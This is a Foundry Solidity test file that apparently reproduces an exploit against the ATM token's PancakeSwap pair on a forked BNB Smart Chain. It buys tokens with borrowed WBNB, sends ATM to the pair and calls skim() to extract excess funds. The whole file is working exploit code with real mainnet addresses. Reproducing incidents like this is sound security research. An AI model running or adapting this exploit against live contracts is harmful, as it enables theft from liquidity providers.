// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

contract AtmTest is Test {
    // USDT/BNB
    IPancakePairV3 USDT_BNB_V3_Pool =
        IPancakePairV3(0x36696169C63e42cd08ce11f5deeBbCeBae652050);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 ATM = IERC20(0xa5957E0E2565dc93880da7be32AbCBdF55788888);

    IPancakeRouterV2 PANCAKE_V2_ROUTER =
        IPancakeRouterV2(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IPancakePairV2 ATM_BNB_Pool =
        IPancakePairV2(0x1F5b26DCC6721c21b9c156Bf6eF68f51c0D075b7);
    IPancakePairV2 USDT_BNB_V2_Pool =
        IPancakePairV2(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);

    uint256 BorrowBNB = 18_993 ether;

    function setUp() public {
        vm.createSelectFork("bsc", 37483301 - 1);
        deal(address(WBNB), address(this), BorrowBNB);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        ATM.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
        WBNB.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);
        USDT.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);

        token2token(address(WBNB), address(USDT), 18_853 ether);
        token2token(address(WBNB), address(ATM), 70 ether);

        // uint256 pair_wbnb = BNB.balanceOf(address(ATM_BNB_Pool));
        print("USDT balance", USDT.balanceOf(address(this)), 18);
        print("ATM balance", ATM.balanceOf(address(this)), 1);
        ATM.transfer(address(ATM_BNB_Pool), ATM.balanceOf(address(this)));
        ATM_BNB_Pool.skim(address(this));
        print("USDT balance", USDT.balanceOf(address(this)), 18);
        print("ATM balance", ATM.balanceOf(address(this)), 1);
    }

    function token2token(address a, address b, uint256 amount) internal {
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);

        PANCAKE_V2_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }
}
